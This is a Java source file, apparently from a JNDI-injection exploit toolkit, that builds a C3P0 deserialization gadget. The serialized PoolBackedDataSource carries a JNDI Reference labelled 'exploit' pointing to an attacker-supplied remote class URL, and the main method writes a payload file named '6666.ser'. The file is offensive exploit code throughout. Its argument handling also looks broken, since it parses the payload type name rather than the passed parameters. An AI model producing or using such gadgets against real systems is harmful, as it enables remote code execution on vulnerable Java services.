package com.nu1r.jndi.gadgets;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;

import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;


public class C3P0 {
    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("6666.ser");
        fous.write(bytes);
        fous.close();
    }
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        String      command = String.valueOf(type);
        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url       = command.substring(0, sep);
        String className = command.substring(sep + 1);

        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(b);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;

        private String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference() throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

    }
}
